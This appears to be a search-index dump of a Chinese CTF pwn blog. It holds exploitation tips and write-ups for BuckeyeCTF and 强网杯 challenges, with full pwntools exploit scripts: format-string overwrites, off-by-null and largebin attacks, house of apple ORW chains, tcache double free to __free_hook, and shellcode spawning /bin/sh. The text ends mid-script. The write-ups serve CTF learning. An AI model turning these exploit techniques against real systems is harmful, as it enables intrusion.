[{"categories":null,"content":"chuwei's friends","date":"2025-05-26","objectID":"/friends/","tags":null,"title":"Index","uri":"/friends/"},{"categories":null,"content":"\r友情链接\r```yaml - nickname: \u003cyour nickname\u003e avatar: \u003cyour avatar\u003e url: \u003cyour site link\u003e description: \u003cdescription of your site\u003e ``` ","date":"2025-05-26","objectID":"/friends/:0:0","tags":null,"title":"Index","uri":"/friends/"},{"categories":["pwn"],"content":"本文主要用于记录pwn题目的一些tips gdb.attach(p,‘b *0x40094c’) b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数 strings libc.so.6|grep ubuntu strings libc.so.6|grep libc 查看libc 版本信息 strings elf | grep GCC 查看libc 信息 但是不一定对，当编译环境和运行环境不一样时 开启和关闭缓存区有什么区别 开启的化printf 遇到\\n才输出， 不开启 就直接输出 %*6$c %7$n相当于%addr c %7$n *6为格式化字符串第六个参数中的值 %p%10$n 前面已经输出的字符 是%p那里的值，比如0x7f60847b55a0 finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return 命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return 命令还有一个功能，即可以指定该函数的返回值。 为了结束while的read循环while ( read(0, nptr, 0x10uLL) \u003e 0 )可以用p.shutdown('send')命令，不过不能再发送第二次了 IDA 修复jmp rax https://bbs.pediy.com/thread-268245.htm https://blog.csdn.net/huzai9527/article/details/121204850 https://www.jianshu.com/p/cc0bc578b951 IO_flush_all_lockp函数触发条件： 当libc执行abort流程时 abort可以通过触发malloc_printerr来触发 当执行exit函数时 当执行流从main函数返回时 一个gadget,暂时不知道有什么用，先记录一下 pwndbg\u003e x/20i svcudp_reply+26 0x7f5cdf09931a \u003csvcudp_reply+26\u003e: mov rbp,QWORD PTR [rdi+0x48] 0x7f5cdf09931e \u003csvcudp_reply+30\u003e: mov rax,QWORD PTR [rbp+0x18] 0x7f5cdf099322 \u003csvcudp_reply+34\u003e: lea r13,[rbp+0x10] 0x7f5cdf099326 \u003csvcudp_reply+38\u003e: mov DWORD PTR [rbp+0x10],0x0 0x7f5cdf09932d \u003csvcudp_reply+45\u003e: mov rdi,r13 0x7f5cdf099330 \u003csvcudp_reply+48\u003e: call QWORD PTR [rax+0x28] 一个将泄露出16进制的flag字符串转换的小脚本 a='flag{afffd8-e4-25-c73ec9b075-18008fbf}' for i in range(13): t=a[4*i:4*i+4] #32位泄露出的是4字节，64位是8字节 print(t[::-1],end='') 将泄露出的小端序数据转换为字符串 byte_str=ru('\\n')[:-1].decode().replace(\"0xa\",'').replace('0x','') print(\"byte_str==\",byte_str) bytes_data = bytes.fromhex(byte_str) bytes_data=bytes_data.decode() string=\"\" for i in range(0, len(bytes_data), 4): string=string+''.join(reversed(bytes_data[i:i+4])) print(string) patchelf 报错修复：https://zikh26.github.io/posts/8cbdee5a.html#patch-libc%E5%92%8Cld%E8%BF%87%E7%A8%8B set context-output /dev/pts/2 方便调试 在flag文件名未知的情况下无法构造常规orw来读取 这时候可以利用getdents64函数，它读取目录文件中的一个个目录项并返回 参考：ls命令是怎样实现的，getdents64，linux-2.6.27.5 https://github.com/Naetw/CTF-pwn-tips 一些小tips libc.search(asm('pop rdi;ret;')).__next__() 搜索libc中的gadgets rop=ROP(libc) pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret'])[0] 查看fs段寄存器：p/x $fs_base 某些情况下patchelf 需要将 libc.so.6 设置为绝对路径 patchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6 ./libc-2.32.so ./elf strcpy 会将结束符\\x00copy到目标字符串，strlen遇到'\\x00'截止 qemu 调试异架构 def killport(port): '''root authority is required''' command=\"kill -9 $(netstat -nlp | grep :\"+str(port)+\" | awk '{print $7}' | awk -F'/' '{{ print $1 }}')\" os.system(command) def mydbg(): attach_payload =\"\"\" gdb-multiarch\\ -ex \"file {0}\"\\ -ex \"targe remote :{1}\"\\ -ex \"setarchitecture {2}\"\\ \"\"\".format('./1',port,\"arm\") # -ex \"add-symbol-file {libc_file_path} {addr}\" pwnlib.util.misc.run_in_new_terminal(attach_payload) 异构静态编译的情况下可以通过arena_get_retry和dl_runtime_reslove来控制参数 aarch64 riscv64: is_trusted_path_normalize 函数这里可以控制sp进行栈迁移 dil 是rdi寄存器的低32位 https://www.jianshu.com/p/57128e477efb 在libc段存在elf 地址，比如stdout 设置返回地址位libc_start_main_impl+139 程序会重新从main函数开始 set context-sections 命令用于配置在打印当前堆栈帧时显示的上下文信息部分。它定义了在上下文输出中显示哪些信息。 该命令接受一个字符串参数，用于指定要包含在上下文显示中的部分。可用的部分包括： all：包括所有可用的部分。 registers：显示寄存器的值。 code：显示反汇编的代码。 stack：显示堆栈内存。 data：显示数据内存。 gs，fs寄存器可以让我们找到程序的地址 %*的利用 [19:41]You can leak value on the stack using %* [19:41]Although u cant specify the index [19:41]U can use %c %c %* to get a leak on any position _nptl_change_stack_perm 可用于设置栈的权限，目前在risc-v题的题目中见过 BuckeyeCTF Spaceman from pwn import * import struct context.binary = elf = ELF(\"./spaceman\") # io = process(\"./run.sh\") # io = remote(\"127.0.0.1\",1337) io = remote(\"challs.pwnoh.io\", 13372) sc = b\"A\"*0x2e sc = b\"\\x93\\x08\\xf0\\x03\\x13\\x05\\x00\\x00\\x93\\x05\\x81\\xec\\x13\\x06\\x00\\x10s\\x00\\x00\\x00\" # sc = b\"A\"*8 # sc += b\"B\"*8 # sc += b\"C\"*8 # sc += b\"D\"*8 io.sendlineafter(b'LOGIN: ',sc) environ = 0x8f6a0 _read = 0x2474e # arb write (write help function over echo 0x89028) address = 0x89008#0x8a990 p = b\"gang\\x00aaa\" p += b\"A\"*8#p64(0x89028) # p = p.ljust(0x10,b\"A\") p += p64(address) # p += b\"C\"*7 p += p64(_read)[:-1] io.sendlineafter(b\"COMMAND\u003e \",p) # sleep(1) p2 = p64(0x89028) p2 += p64(0x89028)[:-1] io.sendlineafter(b\"COMMAND\u003e \", p2) io.send(b\"\\xae\\x07\\x01\") # leak environ p = b\"gang\\x00aaa\" # p += b\"A\"*8#p64(0x89028) p = p.ljust(0x10,b\"A\") p += p64(environ) # p += b\"C\"*7 # p += p64(_read)[:-1] io.sendlineafter(b\"COMMAND\u003e \",p) io.sendlineafter(b\"COMMAND\u003e \",b\"echo\") io.readuntil(b\"COMMANDS:\") io.readline() environ = u64(io.readline(False).ljust(8,b\"\\x00\")) print(\"environ\",hex(environ)) sc_addr = environ-552 ret_addr = environ-144-96 pthread = 0x8a480 # reset sys_run p = b\"gang\\x00aaa\" p += b\"A\"*8#p64(0x89028) # p = p.ljust(0x10,b\"A\") p += p64(0x5aa90) #help # p += b\"C\"*7 p += p64(0x10854)[:-1] #sys_run io.sendlineafter(b\"COMMAND\u003e \",p) io.sendlineafter(b\"COMMAND\u003e \",b\"help\") sc = p64(0x8aa00) # junk writable addr sc += b\"B\"*8 sc += p64(0x4ef00)# make stack executable __nptl_change_stack_perm sc += p64(0x8a480) io.sendlineafter(b'LOGIN: ',sc) # arb write (overwrite ret addr for gad1) address = 0x89008#0x8a990 p = b\"gang\\x00aaa\" p += b\"A\"*8#p64(0x89028) # p = p.ljust(0x10,b\"A\") p += p64(address) # p += b\"C\"*7 p += p64(_read)[:-1] io.sendlineafter(b\"COMMAND\u003e \",p) sleep(1) p2 = p64(ret_addr) p2 += p64(ret_addr)[:-1] io.sendlineafter(b\"COMMAND\u003e \", p2) io.sendline(p64(sc_addr)[:-1]) # sc_addr = 0x0040007ffc70 # p = b\"gang\\x00aaa\" # # p += b\"A\"*8#p64(0x89028) # p = p.ljust(0x10,b\"A\") # p += p64(sc_addr) # # p += b\"C\"*7 # # p += p64(_read)[:-1] # io.sendlineafter(b\"COMMAND\u003e \",p) # sleep(1) # context.log_level = 'debug' # call gad1 gad_1 = 0x443b8 p = b\"gang\\x00aaa\" p += b\"A\"*8#p64(0x89028) # p = p.ljust(0x10,b\"A\") p += p64(0x5aa90) #help # p += b\"C\"*7 p += p64(gad_1)[:-1] io.sendlineafter(b\"COMMAND\u003e \",p) io.sendline(b\"dish\") addr = struct.unpack(\"f\",p32(sc_addr\u00260xfffff000))[0] io.sendlineafter(b\"ENTER COORDINATES: \", b\"0 \"+str(addr).encode() ) io.sendline(\"engines\") addr_top = (sc_addr\u00260xffffffff00000000)\u003e\u003e2**5 io.sendlineafter(b\"ENTER POWER (0-10): \",str(addr_top).encode()) io.sendline(b\"help\") full_shellcode = b\"/bin/sh\\x00\" full_shellcode += b\"\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x17\\x05\\x00\\x00\\x13\\x85\\x05\\x00\\x93\\x05\\x00\\x00\\x13\\x06\\x00\\x00\\x93\\x08\\xd0\\rs\\x00\\x00\\x00\" io.sendline(full_shellcode) io.interactive() ","date":"2025-01-04","objectID":"/posts/pwn%E6%9D%82%E8%AE%B0/:0:0","tags":["杂记"],"title":"PWN杂记","uri":"/posts/pwn%E6%9D%82%E8%AE%B0/"},{"categories":[null],"content":"简介\rchuwei 目前IIE研一在读 baby pwner ","date":"2025-01-04","objectID":"/about/:0:0","tags":[null],"title":"About","uri":"/about/"},{"categories":["赛题复现"],"content":"强网杯\rez_fmt\r解法一\r程序开头给了stack 地址，利用格式化字符串漏洞修改返回地址，爆破one_gadget ，概率为1/4096。 from pwn import* context.arch='amd64' #context.log_level='debug' s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *0x401239\") pause() i=1 while True: p=remote('47.104.24.40',1337) #p=process(\"./ez_fmt\") ru(\"There is a gift for you \") stack_addr=int(ru(\"\\n\"),16) lg(\"stack_addr\") lg(\"i\") i=i+1 w_addr=0x0404010 ret_addr=stack_addr+0x68 main_addr=0x401196 lg(\"ret_addr\") payload=\"%19$p\" payload+=\"%\"+str(0x40-14)+\"c\"+\"%10$hhn\"+\"%\"+str(0xfb01-0x40)+\"c\"+\"%11$hn\" payload=payload.ljust(0x20,'a') payload=payload.encode()+p64(ret_addr+2)+p64(ret_addr) #mydbg() s(payload) # pause() libc_base=int(rn(14),16)-0x24083 lg(\"libc_base\") one_gaget=libc_base+0xe3b01 lg(\"one_gaget\") myogg=(libc_base\u00260xffffffffff000000)+0x40fb01 lg(\"myogg\") if myogg==one_gaget: pause() print(\"success\") else: p.close() continue p.interactive() 解法二\r利用格式化字符串漏洞篡改printf 函数的返回地址为start，同时泄露libc，这样就不会修改w为0，然后第二次格式化字符串漏洞修改返回地址为one gadget。 from pwn import* context.arch='amd64' context.log_level='debug' #p=remote(\"chals.sekai.team\",4001) #libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *0x401239\") pause() p=process(\"./ez_fmt\") ru(\"There is a gift for you \") stack_addr=int(ru(\"\\n\"),16) lg(\"stack_addr\") w_addr=0x0404010 ret_addr=stack_addr-0x8 start_addr=0x4010B0 lg(\"ret_addr\") payload=\"%19$p\"+\"%\"+str((start_addr\u00260xfffff)-14)+\"c\"+\"%9$hn\" payload=payload.encode().ljust(0x18,b\"a\")+p64(ret_addr) sl(payload) libc_base=int(rn(14),16)-0x24083 lg(\"libc_base\") one_gadgt=0xe3b01+libc_base ru(\"There is a gift for you \") ret1_addr=stack_addr-0xe8 lg(\"one_gadgt\") payload=\"%\"+str(one_gadgt\u00260xff)+\"c\"+\"%10$hhn\"+\"%\"+str(((one_gadgt\u003e\u003e8)\u00260xffff)-(one_gadgt\u00260xff))+\"c%11$hn\" payload=payload.encode().ljust(0x20,b\"a\")+p64(ret1_addr)+p64(ret1_addr+1) s(payload) p.interactive() warmup23\rglibc 2.35 下的off by null，和glibc 2.31下的off by null 利用手法相同。 参考链接：http://tttang.com/archive/1614/#toc__6 构造出堆块重叠后进行largebin attack，修改stderr为fake file。然后利用off by null 修改top chunk size，申请一个大的chunk，触发malloc_assert ，利用house of apple 执行orw。 from pwn import* context.arch='amd64' context.log_level='debug' p=remote(\"120.24.69.11\",12700) #p=process('./warmup') libc=ELF('./libc.so.6') s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"dir ~/glibc/glibc-2.35/\") pause() def menu(choice): ru(\"\u003e\u003e \") sl(str(choice)) def add(size,content): menu(1) ru(\"Size:\") sl(str(size)) ru(\"Note:\") s(content) def show(index): menu(2) ru(\"Index:\") sl(str(index)) ru(\"Note:\") def delete(index): menu(3) ru(\"Index:\") sl(str(index)) add(0x418, \"A\"*0x100) #0 A = P-\u003efd add(0xe8,\"barrier\") #1 barrier add(0x438, \"B0\"*0x100) #2 B0 helper add(0x448, \"C0\"*0x100) #3 C0 = P , P\u00260xff = 0 add(0x108,'4'*0x100) #4 barrier add(0x488, \"H\"*0x100) # H0. helper for write bk-\u003efd. vitcim chunk. add(0x428, \"D\"*0x100) # 6 D = P-\u003ebk add(0x108,\"barrier\") # 7 barrier delete(0) #A delete(3) #c0 delete(6) #d #unsortedbin: D-C0-A C0-\u003eFD=A delete(2) # merge B0 with C0. preserve p-\u003efd p-\u003ebk add(0x458, b'a' * 0x438 + p64(0x561)[:-2]) #index 0 put A,D into largebin, split BC. use B1 to set p-\u003esize=0x551 add(0x428,'A') #2 C1 from ub add(0x428,'A') #3 bk D from largebin add(0x418,\"0\"*0x100) #6 fd A from largein delete(6) #A delete(2) #c1 # unsortedbin: C1-A , A-\u003eBK = C1 add(0x418, 'a' * 8) # 2 partial overwrite bk A-\u003ebk = p add(0x418,\"A\") #6 c1 # step4 use ub to set bk-\u003efd delete(6) # C1 delete(3) # D=P-\u003ebk # ub-D-C1 D-\u003eFD = C1 delete(5) # merge D with H, preserve D-\u003efd add(0x500-8, b'6'*0x488 + p64(0x431)) #3 H1. bk-\u003efd = p, partial write \\x00 add(0x3b0,\"A\") #5 recovery delete(4) add(0x108, 0x100*b'4' + p64(0x560)) #4 delete(3) add(0x448,\"A\") #3 put libc to chunk 4 show(4) libc_base=uu64()-0x219ce0 lg(\"libc_base\") show(2) ru(\"a\"*8) heap_base=u64(rn(6).ljust(8,b\"\\x00\"))-0x15f0 lg(\"heap_base\") delete(3) io_stderr=libc_base+0x21a860 lg(\"io_stderr\") add(0x448,p64(libc_base+0x219ce0)*2+p64(0)+p64(0x431)+p64(libc_base+0x21a0d0)*2+p64(heap_base+0xc20)+p64(io_stderr-0x20)) #3 add(0x608,\"a\") #6 read=libc_base+libc.sym['read'] _IO_wfile_jumps=libc_base+libc.sym['_IO_wfile_jumps'] magic_gadget=libc_base+0x169e7a syscall_ret=read+0x10 pop_rax=libc_base+0x0000000000045eb0 pop_rdi=libc_base+0x000000000002a3e5 pop_rsi=libc_base+0x000000000002be51 pop_rdx=libc_base+0x00000000000796a2 ret=libc_base+0x0000000000029cd6 leave_ret=0x000000000004da83+libc_base pop_r12_r15=0x000000000002be4c+libc_base close=libc_base+libc.sym['close'] read=libc_base+libc.sym['read'] write=libc_base+libc.sym['write'] fake_file_addr=heap_base+0xc30 wide_data_addr=fake_file_addr+0xd0 wide_vtable_addr=wide_data_addr+0xe8 rop_addr=wide_vtable_addr+0x70 flag_addr=rop_addr fake_file=p64(0)*3+p64(1) fake_file=fake_file.ljust(0x38,b\"\\x00\")+p64(rop_addr) fake_file=fake_file.ljust(0x90,b\"\\x00\")+p64(wide_data_addr) fake_file=fake_file.ljust(0xc8,b\"\\x00\")+p64(_IO_wfile_jumps) wide_data=b\"\\x00\".ljust(0xe0,b\"\\x00\")+p64(wide_vtable_addr) wide_vtable=b\"\\x00\".ljust(0x68,b\"\\x00\")+p64(magic_gadget) orw=b\"flag\\x00\\x00\\x00\\x00\"+p64(pop_r12_r15)+p64(0)+p64(rop_addr-0x8)+p64(leave_ret)+p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret) orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(rop_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read)+p64(pop_rdi)+p64(1)+p64(write) delete(2) add(0x600,\"A\") #2 payload=fake_file+wide_data+wide_vtable+orw add(0x418,\"A\") #8 delete(3) add(0x448,p64(0)*2+p64(~(2 | 0x8 | 0x800)+(1\u003c\u003c64))+p64(0)+payload) #3 add(0xeec0,\"A\")#9 add(0xeec0,\"A\")#10 add(0x1000-0x480,\"A\")#11 add(0x438,\"A\") #12 delete(12) add(0x438,\"A\"*0x438) menu(1) ru(\"Size:\") sl(str(0x500)) p.interactive() chatting\r解法一\r首先填满0x100的tcache，然后释放当前usrname，使当前用户的message chunk（大小也为0x100） 进入unsorted bin，然后执行read 函数进行泄露libc。 泄露完之后，发现add message 时，如果add message 0x64次后（或者用户名长度大于 0x64），如果再次add会释放当前的message chunk，而如果delete 当前用户就会触发tcahche double free 检测，那么可得知程序中存在double free。 接下来通过构造chunk 结构，利用house of botcake 制造出重叠chunk，然后利用tcache 申请到free_hook 修改其为system，最后释放一个content为\"/bin/sh\\x00\"的chunk 即可getshell from pwn import* context.arch='amd64' context.log_level='debug' #p=remote(\"101.200.122.251\",14509) p=process('./chatting') libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #libc=ELF('./libc-2.27.so') s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *$rebase(0x000321F)\\n decompiler connect ida --host 10.193.253.113 --port 3662\") pause() def menu(choice): ru(\"Choose action (add, delete, switch, message, read, listuser, exit): \") sl(choice) def add(usrname): menu(\"add\") ru(\"Enter new username:\") sl(usrname) def delete(usrname): menu(\"delete\") ru(\"Enter username to delete:\") sl(usrname) def switch_func(usrname): menu(\"switch\") ru(\"Enter username to switch to: \") sl(usrname) def message_func(usrname,size,content): menu(\"message\") ru(\"To: \") sl(usrname) ru(\"Message size:\") sl(str(size)) ru(\"Content:\") sl(content) def read_func(): menu(\"read\") def list_func(): menu(\"listuser\") ru(\"Enter new username:\") sl(\"chuwei1\") message_func(\"chuwei1\",0x100,\"a\") add(\"chuwei2\") for i in range(7): message_func(\"chuwei2\",0x100,\"a\") delete(\"chuwei2\") add(\"chuwei2\") delete(\"chuwei1\") read_func() libc_base=uu64()-96-0x10-libc.sym['__malloc_hook'] #libc_base=uu64()-0x219ce0 lg(\"libc_base\") add(\"chuwei1\") for i in range(0x64): message_func(\"chuwei2\",0x30,\"aaaaaaaaaaaa\") for i in range(9): message_func(\"chuwei1\",0x200,\"aaaaaaaaaaaa\") add(\"chuwei3\") delete(\"chuwei1\") add(\"chuwei1\") for i in range(7): message_func(\"chuwei1\",0x200,\"aaaaaaaaaaaa\") message_func(\"chuwei3\",0x200,\"aaaaaaaaaaaa\") #prev message_func(\"chuwei2\",0x200,\"a\"*0x100) add(\"chuwei4\") message_func(\"chuwei4\",0x200,\"a\"*0x100) #vitim delete(\"chuwei1\") add(\"chuwei1\") delete(\"chuwei4\") add(\"chuwei4\") delete(\"chuwei3\") add(\"chuwei3\") message_func(\"chuwei3\",0x200,\"aaaaaaaaaaaa\") delete(\"chuwei2\") add(\"chuwei2\") mydbg() message_func(\"chuwei2\",0x410,b\"\\x00\"*0x200+p64(0x210)+p64(0x211)+p64(libc_base+libc.sym['__free_hook'])) message_func(\"chuwei2\",0x200,\"/bin/sh\\x00\") message_func(\"chuwei2\",0x200,p64(libc_base+libc.sym['system'])) delete(\"chuwei2\") p.interactive() 解法二\r向一个删除过的用户发送消息时候，多次申请message chunk 会导致释放其中的message chunk，然后再次add 该用户，会导致一个double free。可以利用这点构造出一个重叠堆块，具体构造脚本如下： from pwn import* context.arch='amd64' context.log_level='debug' p=process('./chatting') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *$rebase(0x000321F)\")#\\n decompiler connect ida --host 10.193.253.113 --port 3662\") pause() def menu(choice): ru(\"Choose action (add, delete, switch, message, read, listuser, exit): \") sl(choice) def add(usrname): menu(\"add\") ru(\"Enter new username:\") sl(usrname) def delete(usrname): menu(\"delete\") ru(\"Enter username to delete:\") sl(usrname) def switch_func(usrname): menu(\"switch\") ru(\"Enter username to switch to: \") sl(usrname) def message_func(usrname,size,content): menu(\"message\") ru(\"To: \") sl(usrname) ru(\"Message size:\") sl(str(len(content))) ru(\"Content:\") sl(content) def read_func(): menu(\"read\") def list_func(): menu(\"listuser\") ru(\"Enter new username:\") sl(\"chuwwei1\") add(\"cc\") add(\"bb\") add('aa') for i in range(3): message_func('bb', 0x78, b'a' * 0x78) delete(\"bb\") add(\"bb\") delete(\"aa\") message_func('aa', 0x78, b'a' * 0x78) message_func('aa', 0x78, b'a' * 0x78) message_func('aa', 0x78, b'a' * 0x78) message_func('bb',0x78,b\"a\"*0x78) #double free for i in range(7): message_func(\"cc\",0x78,b\"c\"*0x78) delete(\"cc\") add(\"cc\") add(\"aa\") message_func('aa', 0x78, b'a' * 0x78) delete(\"bb\") p.interactive() simpleinterpreter\r程序实现一个c语言编译器，可以解析以下函数和类型。 那么我们利用malloc 和free 将一个chunk 释放到unsorted bin 中， 利用printf 打印出libc地址，然后tcache 的fd中写入free_hook，申请到free_hook 修改其为system，最后释放一个content为\"/bin/sh\\x00\"的chunk 即可getshell。 from pwn import* p=remote(\"101.200.122.251\",13410) #p=process('./simpleinterpreter') libc=ELF('./libc-2.27.so') context.log_level='debug' context.arch='amd64' s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xf7\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"decompiler connect ida --host 192.168.2.193 --port 3662\\nb *$rebase(0x0CCB)\") pause() #0x1c48 payload=\"\"\" int main(){ void *p1; void *p2; void *p3; void *p4; void *p5; void *p6; void *p7; void *p8; void *p9; void *p10; void *p11; p1=malloc(0x100); p2=malloc(0x100); p3=malloc(0x100); p4=malloc(0x100); p5=malloc(0x100); p6=malloc(0x100); p7=malloc(0x100); p8=malloc(0x100); p9=malloc(0x100); free(p1); free(p2); free(p3); free(p4); free(p5); free(p6); free(p7); free(p8); printf(\"%s\",p8); read(0,p7,0x8); p10=malloc(0x100); read(0,p10,0x8); p11=malloc(0x100); read(0,p11,0x8); free(p10); }\"\"\" ru(\"Code size: \") sl(str(int(len(payload)))) ru(\"Please give me the code to interpret:\") s(payload) libc_base=uu64()-0x3ebca0 lg(\"libc_base\") pause() s(p64(libc_base+libc.sym['__free_hook'])) pause() s(\"/bin/sh\\x00\") pause() s(p64(libc_base+libc.sym['system'])) p.interactive() WTOA\r参考链接：https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#11-chatting 从ida 中的function call 中猜测main函数为function[17] ida 导出function cal 先导出为test.gdl ubuntu 执行 sudo apt-get install cflow graphviz sudo apt install libgraph-easy-perl graph-easy --input=test.gdl --as_dot -o test.dot 先运行程序发现是一个经典的菜单题目，因此主要逻辑函数里面肯定存在5个功能 和while 循环 最终发现function_17_ 是符合要求的，因此我们可以在function_17 下断点验证我们的猜想 我们会发现，我们执行function 16会打印菜单字符串 注意到function51 的第三个参数为0x477，而菜单字符串的地址为0x1b477，0x1b000正好是.rodata.wasm 段的起始地址，因此推断字符串的寻址应该为段基址+偏移 那么我们很容易得到各个函数的位置。 接下来我们创建一些chunk ，观察结构。 发现note 结构体的一些内容如图所示，推测0x501cc0是note content的偏移，因为note content也是0xcc0 结尾的，而0x8 就是note 的size，还有一些特殊的值比如next 和prev 的note_struct 偏移，剩下的应该是一些特殊标志变量。 接着分析主函数 当我下断点在function 56 时，会发现要求我们输入 注意到rdx为0，rcx为0x501b20，r8为0x2， 因此推测改函数实现了read 的功能read(0,offset,0x2) ，而真正的地址应该为段基址+offset 输入之前该地址的内容为空 输入之后S\\n 之后正好为'\\x0a\\x53' 接下来根据读入的字符串 -'A' ，switch case进行选择功能 接下来还可以利用patch 讲function51的第三个参数加上0x1b000，方便我们观看， 还可以推出function 24 类似于atoi函数 function 9里面调用了function 56read函数，进行逐个字节读入。 在edit函数中存在一个明显的漏洞函数，当输入的length为0x345231时，我们可以读入0x30 字节。 程序开始时会读入flag ，位于我们创建的note struct 上方，因此，我们可以利用edit 的溢出，更改下一个chunk 的content 偏移，让它指向flag的位置，从而打印出flag。 from pwn import* context.log_level='debug' context.arch='amd64' #p=process(\"./launch.sh\") p=process(['./wasmtime','run','--env', \"FLAG=flag{you_cat_the_flag}\",'--disable-cache','--allow-precompiled','./wtoa']) def mydbg(): gdb.attach(p) pause() s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def menu(choice): ru(\"Choice \u003e \") sl(choice) def add(size,content): menu(\"A\") ru(\"size \u003e \") sl(str(size)) ru(\"\u003e \") s(content) def edit(index,offset,length,content): menu(\"E\") ru(\"index \u003e\") sl(str(index)) ru(\"offset \u003e\") sl(str(offset)) ru(\"length \u003e \") sl(str(length)) ru(\"\u003e \") s(content) def delete(index): menu(\"D\") ru(\"index \u003e\") sl(str(index)) def show(index,offset,length): menu(\"S\") ru(\"index \u003e\") sl(str(index)) ru(\"offset \u003e\") sl(str(offset)) ru(\"length \u003e \") 